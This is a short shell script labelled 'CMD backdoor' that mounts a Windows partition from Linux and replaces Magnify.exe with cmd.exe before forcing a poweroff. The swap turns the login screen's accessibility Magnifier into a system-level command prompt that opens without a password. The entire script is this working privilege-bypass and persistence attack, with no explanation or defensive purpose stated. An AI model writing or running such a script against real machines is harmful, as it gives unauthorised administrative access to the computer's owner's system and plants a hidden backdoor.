#!/bin/sh
# CMD backdoor
sudo mount -t ntfs-3g /dev/sda2 /mnt
sudo mv /mnt/Windows/System32/Magnify.exe /mnt/Windows/System32/Magnify.old
sudo cp /mnt/Windows/System32/cmd.exe /mnt/Windows/System32/Magnify.exe
/sbin/poweroff -f
